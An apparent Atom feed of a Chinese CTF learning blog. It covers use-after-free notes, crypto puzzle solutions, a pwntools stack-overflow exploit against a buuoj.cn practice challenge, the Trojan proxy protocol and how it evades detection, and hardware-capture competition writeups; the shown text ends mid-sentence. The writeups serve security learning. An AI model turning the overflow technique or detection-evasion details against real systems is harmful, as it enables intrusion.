<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ch3cke的小站</title>
  
  <subtitle>长夜将至，我从今日起开始守望</subtitle>
  <link href="http://ch3cke.github.io/atom.xml" rel="self"/>
  
  <link href="http://ch3cke.github.io/"/>
  <updated>2021-06-10T14:40:15.389Z</updated>
  <id>http://ch3cke.github.io/</id>
  
  <author>
    <name>ch3cke</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[PWNABLE.kr]uaf</title>
    <link href="http://ch3cke.github.io/2020/06/14/PWNABLE-kr-uaf/"/>
    <id>http://ch3cke.github.io/2020/06/14/PWNABLE-kr-uaf/</id>
    <published>2020-06-14T12:43:20.000Z</published>
    <updated>2021-06-10T14:40:15.389Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="UAF知识"><a href="#UAF知识" class="headerlink" title="UAF知识"></a>UAF知识</h2><ol><li><p>UAF：Use After Free是PWN中常见的堆利用方式，是指在程序中对于某个指针在free后，指针的值并没有置为NULL，仍然可以被调用。</p></li><li><p>使用方式</p><ul><li>构造一个迷途指针，或者说一个Free调但是指针值未被值为NULL的指针</li></ul></li></ol><ul><li>构造数据填充被释放的内存区域<ul><li>再次调用该指针</li></ul></li></ul><ol start="3"><li><p>地址分配方式</p><p>在填充数据的时候，我们需要考虑到内存分配机制。我们要保证我们使用的数据能被分配到正确的地方去，所以需要了解一定的内存分配机制。</p></li></ol><h2 id="C-虚函数"><a href="#C-虚函数" class="headerlink" title="C++虚函数"></a>C++虚函数</h2><p>   一旦一个类有虚函数，编译器会为这个类建立一张vtable。子类继承父类vtable中所有项，当子类有同名函数时，修改vtable同名函数地址，改为指向子类的函数地址，子类有新的虚函数时，在vtable中添加。记住，私有函数无法继承，但如果私有函数是虚函数，vtable中会有相应的函数地址，所有子类可以通过手段得到父类的虚私有函数。</p>]]></content>
    
    
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;
&lt;h1 id=&quot;UAF&quot;&gt;&lt;a href=&quot;#UAF&quot; class=&quot;headerlink&quot; title=&quot;UAF&quot;&gt;&lt;/a&gt;UAF&lt;/h1&gt;&lt;h2 id=&quot;UAF知识&quot;&gt;&lt;a href=&quot;#UAF知识&quot; class=&quot;headerlink&quot; title=&quot;UAF知识&quot;&gt;&lt;/a&gt;UAF知识&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;UAF：Use After Free是PWN中常见的堆利用方式，是指在程序中对于某个指针在free后，指针的值并没有置为NULL，仍然可以被调用。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;使用方式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;构造一个迷途指针，或者说一个Free调但是指针值未被值为NULL的指针&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;构造数据填充被释放的内存区域&lt;ul&gt;
&lt;li&gt;再次调用该指针&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CTF学习记录</title>
    <link href="http://ch3cke.github.io/2020/03/12/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://ch3cke.github.io/2020/03/12/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2020-03-12T14:35:51.000Z</published>
    <updated>2021-06-10T14:40:18.404Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="0x01-Crypto"><a href="#0x01-Crypto" class="headerlink" title="0x01 Crypto"></a>0x01 Crypto</h2><h3 id="ROT"><a href="#ROT" class="headerlink" title="ROT"></a>ROT</h3><p>题目链接：<a href="https://buuoj.cn/files/3cc926e4d300e09c64cdfe79e9aafd6c/a6a57ad9-733a-46b3-b233-c932712e7c70.zip?token=eyJ1c2VyX2lkIjo1MTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjEwM30.XmpJtA.dIAyc6lC0FaBOvD-nuV2Fok_e9M">点击获取</a></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>首先，需要了解什么是ROT。ROT是一种简单的替换算法，这种算法的主要加密方法是将所有明文密码同时左移或者右移某一长度，常见的是ROT13。ROT可以在二十六个字母之间替换，也可以在所有可见字符替换，如果没有指明是什么替换的话，全部试一遍也许是个不错的选择，运算量也不大。恺撒加密可以是为ROT的一种。</p><h4 id="解密代码"><a href="#解密代码" class="headerlink" title="解密代码"></a>解密代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">cipher = [<span class="number">83</span>, <span class="number">89</span>, <span class="number">78</span>, <span class="number">84</span>, <span class="number">45</span>, <span class="number">86</span>, <span class="number">96</span>, <span class="number">45</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">136</span>, <span class="number">132</span>, <span class="number">132</span>, <span class="number">132</span>, <span class="number">108</span>, <span class="number">128</span>, <span class="number">117</span>, <span class="number">118</span>, <span class="number">134</span>, <span class="number">110</span>, <span class="number">123</span>,</span><br><span class="line">          <span class="number">111</span>, <span class="number">110</span>, <span class="number">127</span>, <span class="number">108</span>, <span class="number">112</span>, <span class="number">124</span>, <span class="number">122</span>, <span class="number">108</span>, <span class="number">118</span>, <span class="number">128</span>, <span class="number">108</span>, <span class="number">131</span>, <span class="number">114</span>, <span class="number">127</span>, <span class="number">134</span>, <span class="number">108</span>, <span class="number">116</span>, <span class="number">124</span>, <span class="number">124</span>, <span class="number">113</span>, <span class="number">108</span>, <span class="number">76</span>,</span><br><span class="line">          <span class="number">76</span>, <span class="number">76</span>, <span class="number">76</span>, <span class="number">138</span>, <span class="number">23</span>, <span class="number">90</span>, <span class="number">81</span>, <span class="number">66</span>, <span class="number">71</span>, <span class="number">64</span>, <span class="number">69</span>, <span class="number">114</span>, <span class="number">65</span>, <span class="number">112</span>, <span class="number">64</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">69</span>, <span class="number">61</span>, <span class="number">70</span>, <span class="number">114</span>, <span class="number">62</span>, <span class="number">66</span>, <span class="number">61</span>, <span class="number">62</span>, <span class="number">69</span>,</span><br><span class="line">          <span class="number">67</span>, <span class="number">70</span>, <span class="number">63</span>, <span class="number">61</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">64</span>, <span class="number">68</span>, <span class="number">62</span>, <span class="number">70</span>, <span class="number">61</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">112</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>():</span></span><br><span class="line">    flag = <span class="string">&quot;flag&#123;www_shiyanbar_com_is_very_good_&quot;</span></span><br><span class="line">    <span class="comment"># print hashlib.md5(flag).hexdigest()</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">                    <span class="built_in">print</span> flag + <span class="built_in">chr</span>(a) + <span class="built_in">chr</span>(b) + <span class="built_in">chr</span>(c) + <span class="built_in">chr</span>(d) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">str</span>(hashlib.md5(flag + <span class="built_in">chr</span>(a) + <span class="built_in">chr</span>(b) + <span class="built_in">chr</span>(c) + <span class="built_in">chr</span>(</span><br><span class="line">                            d) + <span class="string">&quot;&#125;&quot;</span>).hexdigest()) == <span class="string">&quot;38e4c352809e150186920aac37190cbc&quot;</span>:</span><br><span class="line">                        <span class="built_in">print</span> flag + <span class="built_in">chr</span>(a) + <span class="built_in">chr</span>(b) + <span class="built_in">chr</span>(c) + <span class="built_in">chr</span>(d)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        flag = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">            flag += <span class="built_in">chr</span>(i - j)</span><br><span class="line">        <span class="built_in">print</span> flag</span><br><span class="line">    check()</span><br></pre></td></tr></table></figure><h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>本来以为flag后面都是小写字母，所以一开始只跑了小写字母，跑了半天跑不出来，扩大范围后成功搞定：</p><p><a href=""><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_200312152838QQ%E6%88%AA%E5%9B%BE20200312232030.png" alt="img"></a></p><h3 id="四面八方"><a href="#四面八方" class="headerlink" title="四面八方"></a>四面八方</h3><p>题目链接：<a href="https://buuoj.cn/files/adf09f561e314b56e65728810c377035/7ce788ae-4e7e-4c30-b9b9-c558ad94f7c5.zip?token=eyJ1c2VyX2lkIjo1MTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjE4MH0.XmpVkw.BOqIrh67tkpxMQfO6eSXFRtCbwM">点击获取</a></p><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>来自题目的提示，四面八方，提示四方密码。<strong>四方密码</strong>是一种对称式加密法，由法国人Felix Delastelle（1840年–1902年）发明。 这种方法将字母两个一组，然后采用多字母替换密码。首先选择两个英文字作密匙，例如example和keyword。对于每一个密匙，将重复出现的字母去除，即example要转成exampl，然后将每个字母顺序放入矩阵，再将余下的字母顺序放入矩阵，便得出加密矩阵。<br>将这两个加密矩阵放在右上角和左下角，余下的两个角放a到z顺序的矩阵：<br>加密的步骤：</p><ol><li>两个字母一组地分开讯息：（例如hello world变成he ll ow or ld）；</li><li>找出第一个字母在左上角矩阵的位置；</li><li>同样道理，找第二个字母在右下角矩阵的位置；</li><li>找右上角矩阵中，和第一个字母同行，第二个字母同列的字母；</li><li>找左下角矩阵中，和第一个字母同列，第二个字母同行的字母；</li><li>得到的这两个字母就是加密过的讯息。</li><li>he lp me ob iw an ke no bi的加密结果：FY NF NE HW BX AF FO KH MD</li></ol><p><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_20031215365014902656863653.jpg!33.jpg"></p><h4 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h4><p>自己动手画</p><h2 id="0x02-PWN"><a href="#0x02-PWN" class="headerlink" title="0x02 PWN"></a>0x02 PWN</h2><h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><p>题目链接：<a href="https://buuoj.cn/files/dcd3c0cc561089a3969fba10d626ccf6/warmup_csaw_2016?token=eyJ1c2VyX2lkIjo1MTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjI5MH0.XmpYGw.FeTRtFI215Vnv-BJFYhg9Jlhp5g">点击获取</a></p><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>IDA打开之后，可以看到：</p><p><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_200312155055QQ%E6%88%AA%E5%9B%BE20200312235011.png"></p><p>可以看到危险函数gets，常见的危险函数还有strcpy，strcat，sprintf。这些函数可以造成缓冲区溢出。简单的说，我们需要用数据填充缓冲区，覆盖返回地址，这样我们就可以控制代码执行。在这个程序中，存在一个构造好的函数，用于读取flag。</p><p><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_200312155906QQ%E6%88%AA%E5%9B%BE20200312235828.png"></p><p>这个地址也被输给我们了，所以我们只要确定到底要覆盖多长就行了。开启pwn-dbg调试。</p><p>我们可以用python的pwn模块下的cyclic函数构造一个比较长的字符串并输入，可以发现：</p><p><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_200312161025QQ%E6%88%AA%E5%9B%BE20200313000759.png"></p><p>可以发现长度为72</p><p><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_200312161025QQ%E6%88%AA%E5%9B%BE20200313000759.png"></p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="comment">#p = pwn.process(&#x27;./warmup_csaw_2016&#x27;)</span></span><br><span class="line">p = pwn.remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26272</span>)</span><br><span class="line">elf = pwn.ELF(<span class="string">&#x27;./warmup_csaw_2016&#x27;</span>)</span><br><span class="line">assdr = <span class="number">0x40060d</span></span><br><span class="line">pwn.context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">pwn.context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;a&#x27;</span>*<span class="number">72</span>+pwn.p64(assdr)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()<span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;
&lt;h2 id=&quot;0x01-Crypto&quot;&gt;&lt;a href=&quot;#0x01-Crypto&quot; class=&quot;headerlink&quot; title=&quot;0x01 Crypto&quot;&gt;&lt;/a&gt;0x01 Crypto&lt;/h2&gt;&lt;h3 id=&quot;ROT&quot;&gt;&lt;a href=&quot;#ROT&quot; class=&quot;headerlink&quot; title=&quot;ROT&quot;&gt;&lt;/a&gt;ROT&lt;/h3&gt;&lt;p&gt;题目链接：&lt;a href=&quot;https://buuoj.cn/files/3cc926e4d300e09c64cdfe79e9aafd6c/a6a57ad9-733a-46b3-b233-c932712e7c70.zip?token=eyJ1c2VyX2lkIjo1MTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjEwM30.XmpJtA.dIAyc6lC0FaBOvD-nuV2Fok_e9M&quot;&gt;点击获取&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h4&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Trojan流量分析</title>
    <link href="http://ch3cke.github.io/2020/02/18/Trojan%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <id>http://ch3cke.github.io/2020/02/18/Trojan%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
    <published>2020-02-18T15:20:52.000Z</published>
    <updated>2021-06-10T14:40:12.080Z</updated>
    
    <content type="html"><![CDATA[<p>﻿## 原理解析</p><p><img src="https://img-blog.csdnimg.cn/20200218223743627.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JsYXRlb3I=,size_16,color_FFFFFF,t_70" alt="Trojan原理"><br>如图所示，Trojan工作在443端口，处理来自外界的HTTPS请求，如果是合法的Trojan请求，那么为该请求提供服务，否则就将该流量转发给web。服务器Nginx，由Nginx为其提供服务。基于这个工作工程可以知道，Trojan的一切表现均与Nginx一致，不会引入额外特征，从而达到无法识别的效果。当然，为了防止恶意探测，我们需要将80端口的流量全部重定向到443端口，并且服务器只暴露80和443端口，这样可以使得服务器与常见的Web服务器表现一致。</p><p>当Trojan客户端连接到服务器时，它首先执行真正的TLS握手。如果握手成功，则所有后续流量都将受到TLS的保护；</p><span id="more"></span><h2 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h2><p><strong>本机IP</strong>: 192.168.31.176</p><p><strong>服务器IP</strong>: 91.220.202.97<br><img src="https://img-blog.csdnimg.cn/20200218224249153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JsYXRlb3I=,size_16,color_FFFFFF,t_70" alt="TCP与TLS握手"><br>TCP握手包序号：73，74，75</p><p>TLS握手：76，77，78，79，80，81，82，83</p><p>然后，客户端发送以下结构（TLS加密之后的）：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+-----------------------+</span>---------<span class="code">+----------------+</span>---------<span class="code">+----------+</span></span><br><span class="line"><span class="section">| hex(SHA224(password)) |  CRLF   | Trojan Request |  CRLF   | Payload  |</span></span><br><span class="line"><span class="section">+-----------------------+---------+----------------+---------+----------+</span></span><br><span class="line"><span class="section">|          56           | X&#x27;0D0A&#x27; |    Variable    | X&#x27;0D0A&#x27; | Variable |</span></span><br><span class="line"><span class="section">+-----------------------+---------+----------------+---------+----------+</span></span><br></pre></td></tr></table></figure><p>当Trojan 请求是类似于如下SOCKS5的请求：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+-----+</span>------<span class="code">+----------+</span>----------+</span><br><span class="line"><span class="section">| CMD | ATYP | DST.ADDR | DST.PORT |</span></span><br><span class="line"><span class="section">+-----+------+----------+----------+</span></span><br><span class="line"><span class="section">|  1  |  1   | Variable |    2     |</span></span><br><span class="line"><span class="section">+-----+------+----------+----------+</span></span><br><span class="line"></span><br><span class="line">o  CMD</span><br><span class="line"><span class="code">        o  CONNECT X&#x27;01&#x27;</span></span><br><span class="line"><span class="code">        o  UDP ：X&#x27;03&#x27;</span></span><br><span class="line">o  ATYP </span><br><span class="line"><span class="code">        o  IP V4 : X&#x27;01&#x27;</span></span><br><span class="line"><span class="code">        o  域名: X&#x27;03&#x27;</span></span><br><span class="line"><span class="code">        o  IP V6 : X&#x27;04&#x27;</span></span><br><span class="line">o  DST.ADDR 所需的目标地址</span><br><span class="line">o  DST.PORT 目标端口</span><br></pre></td></tr></table></figure><h2 id="UDP模式"><a href="#UDP模式" class="headerlink" title="UDP模式"></a>UDP模式</h2><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+------+</span>----------<span class="code">+----------+</span>--------<span class="code">+---------+</span>----------+</span><br><span class="line"><span class="section">| ATYP | DST.ADDR | DST.PORT | Length |  CRLF   | Payload  |</span></span><br><span class="line"><span class="section">+------+----------+----------+--------+---------+----------+</span></span><br><span class="line"><span class="section">|  1   | Variable |    2     |   2    | X&#x27;0D0A&#x27; | Variable |</span></span><br><span class="line"><span class="section">+------+----------+----------+--------+---------+----------+</span></span><br></pre></td></tr></table></figure><p>服务器收到第一个数据包时，将检查哈希密码是否正确以及Trojan请求是否有效。如果不是，则将该协议视为非Trojan请求。</p><p>请注意，第一个数据包将附加有效负载。这避免了长度模式检测，并可能减少要发送的数据包数量。</p><p>如果请求有效，则Trojan服务器将连接到DST.ADDR和DST.PORT字段指示的目标服务器，并在服务器和Trojan客户端之间打开通道。</p><p>因为通常将Trojan服务器假定为HTTPS服务器，所以侦听套接字始终是TLS套接字。在执行TLS握手之后，如果Trojan服务器确定流量为非Trojan协议，则会在服务器端点（默认为本地HTTP服务器127.0.0.1:80）到客户端之间打开一条连接，因此服务器端点控制解密的TLS流量。</p><p>所有没有正确结构和密码的连接都将重定向到预设的网址，因此，如果连接了链接，则Trojan服务器的行为与该网址完全相同（默认为HTTP）。</p><h2 id="反检测"><a href="#反检测" class="headerlink" title="反检测"></a>反检测</h2><p>由于流量受TLS保护（使用有效证书是用户的责任），因此，如果您访问的是HTTP站点，则流量与HTTPS相同（TLS握手后只有一个RTT）；如果您不访问HTTP站点，则流量看起来与保持活动的HTTPS或WebSocket相同。因此，Trojan还可以绕过ISP QoS限制。</p><h2 id="Trojan标本"><a href="#Trojan标本" class="headerlink" title="Trojan标本"></a>Trojan标本</h2><h3 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h3><p><img src="https://img-blog.csdnimg.cn/20200218224715547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JsYXRlb3I=,size_16,color_FFFFFF,t_70" alt="包长度"></p><h3 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h3><p><img src="https://img-blog.csdnimg.cn/20200218224747459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JsYXRlb3I=,size_16,color_FFFFFF,t_70" alt="IP"><br><a href="https://xbsj7654.space/">实例</a></p><p>搭建方式：</p><p><a href="https://bk.shunleite.com/post-45.html">点击进入</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;﻿## 原理解析&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200218223743627.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JsYXRlb3I=,size_16,color_FFFFFF,t_70&quot; alt=&quot;Trojan原理&quot;&gt;&lt;br&gt;如图所示，Trojan工作在443端口，处理来自外界的HTTPS请求，如果是合法的Trojan请求，那么为该请求提供服务，否则就将该流量转发给web。服务器Nginx，由Nginx为其提供服务。基于这个工作工程可以知道，Trojan的一切表现均与Nginx一致，不会引入额外特征，从而达到无法识别的效果。当然，为了防止恶意探测，我们需要将80端口的流量全部重定向到443端口，并且服务器只暴露80和443端口，这样可以使得服务器与常见的Web服务器表现一致。&lt;/p&gt;
&lt;p&gt;当Trojan客户端连接到服务器时，它首先执行真正的TLS握手。如果握手成功，则所有后续流量都将受到TLS的保护；&lt;/p&gt;
&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;
&lt;h2 id=&quot;实例：&quot;&gt;&lt;a href=&quot;#实例：&quot; class=&quot;headerlink&quot; title=&quot;实例：&quot;&gt;&lt;/a&gt;实例：&lt;/h2&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>第十二届全国大学生信息安全竞赛--Writeup</title>
    <link href="http://ch3cke.github.io/2019/04/23/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-Writeup/"/>
    <id>http://ch3cke.github.io/2019/04/23/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-Writeup/</id>
    <published>2019-04-23T04:16:29.000Z</published>
    <updated>2021-06-10T14:40:20.249Z</updated>
    
    <content type="html"><![CDATA[<p>Author: <a href="https://ch3cke.github.io/">ch3cke</a></p><span id="more"></span><h2 id="0x00-签到题"><a href="#0x00-签到题" class="headerlink" title="0x00 签到题"></a>0x00 签到题</h2><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B12/%E7%AD%BE%E5%88%B0%E9%A2%98%E7%9B%AE.png" alt="签到"></p><p>文件连接：<a href="https://github.com/ch3cke/challenges/raw/master/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%9B%BD%E8%B5%9B/qiandao_32ac2a19cef66c300e29fafac57b9e1a%20(1).zip">点击下载</a></p><p>直接在本地运行，会调用摄像头识别人脸，如果有三个人出现就会在运行终端出现flag;(不过识别不是那么精确，感有时候一个人也可以)</p><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B12/%E7%AD%BE%E5%88%B0.png" alt="签到flag"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">87</span>e<span class="number">37</span>d<span class="number">95</span>-<span class="number">6</span>a<span class="number">48</span>-<span class="number">4463</span>-aff<span class="number">8</span>-b<span class="number">0</span>dbd<span class="number">27</span>d<span class="number">3</span>b<span class="number">7</span>d&#125;</span><br></pre></td></tr></table></figure><h2 id="0x01-saleae"><a href="#0x01-saleae" class="headerlink" title="0x01 saleae"></a>0x01 saleae</h2><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B12/seleae.png" alt="saleae"></p><p>文件地址：<a href="https://github.com/ch3cke/challenges/raw/master/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%9B%BD%E8%B5%9B/saleae_b73227737dbbfb7c966cf2ce2f7aeb7f.zip">点击下载</a></p><p>打开压缩包，发现是一个saleae.logicdata这样的文件，没见过，google一下，找到一点<a href="https://www.waitalone.cn/security-hardware-usb.html">资料</a>，下载软件，打开分析。</p><p>信道一：时钟信号</p><p>信道三：数据信号</p><p>设置一下，然后直接分析得到答案。（ps:也可以把数据信号的数据导出成二进制，然后转成字符。）</p><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B12/seleae-flag.png" alt="seleae——flag"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">12071397</span>-<span class="number">19</span>d<span class="number">1</span>-<span class="number">48</span>e<span class="number">6</span>-be<span class="number">8</span>c-<span class="number">784</span>b<span class="number">89</span>a<span class="number">95</span>e<span class="number">07</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-24c"><a href="#0x03-24c" class="headerlink" title="0x03 24c"></a>0x03 24c</h2><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B12/24c.png" alt="24c"></p><p>文件地址：<a href="https://github.com/ch3cke/challenges/raw/master/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%9B%BD%E8%B5%9B/24c_ee1ec3b00fd7a89be0db18fb299cf2ad.zip">点击下载</a></p><p>这题和上题的的数据差不多，不过所用的协议有点不同，采用的是i2c，这是<a href="https://blog.csdn.net/skyflying2012/article/details/8237881">详细介绍</a>，一样也是用Saleae Logic打开文件，分析采用i2c协议，可以看到有数据读写的过程。</p><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B12/24c-a.png" alt="24c-a"></p><p>但是存在一个坑点就是，这个东西需要你稍微看懂一点这个语法的意思，例如 <code>Setup Write to [&#39;160&#39;] + ACK </code> 意思是写入数据，ACK表述信号收到（可能不是那么标准），’ ’+ACK表示写入的地址，后面的是写入的数据，翻译：向设备的0x20(‘ 